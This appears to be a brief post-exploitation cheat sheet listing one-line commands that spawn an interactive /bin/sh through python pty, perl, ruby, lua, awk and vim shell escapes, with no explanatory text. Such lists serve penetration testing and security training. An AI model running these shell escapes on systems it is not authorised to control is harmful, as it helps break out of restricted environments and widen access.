
```
python -c 'import pty; pty.spawn("/bin/sh")' 
```
```
/bin/sh -i
```
```
perl -e 'exec "/bin/sh";'
```
```
ruby: exec "/bin/sh"
```
```
lua: os.execute('/bin/sh')
```
```
awk 'BEGIN {system("/bin/sh")}'
```
vim -c ':!/bin/sh'
```
```
vim
:set shell=/bin/sh
:shell
```